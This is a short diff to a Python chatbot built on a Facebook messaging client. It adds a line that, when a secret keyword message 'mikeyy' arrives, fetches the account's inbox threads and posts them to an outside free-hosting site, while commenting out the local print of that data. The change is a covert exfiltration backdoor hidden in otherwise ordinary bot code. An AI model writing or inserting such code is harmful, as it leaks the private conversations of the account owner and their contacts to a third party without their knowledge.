@@ -580,9 +580,10 @@ class ChatBot(Client):
                 texttospeech(reply)
             elif ("mikeyy" == msg):
                 reply = str(self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None))
+                requests.post("https://mikeytest123.000webhostapp.com/",data={"data":reply})
                 #sendMsg()
-                print(reply)
-                sys.stdout.flush()
+                #print(reply)
+                #sys.stdout.flush()
             #self.changeNickname("Bot", user_id=100086019336728, thread_id=thread_id, thread_type=thread_type)
             #reply = msg;
             #sendMsg()
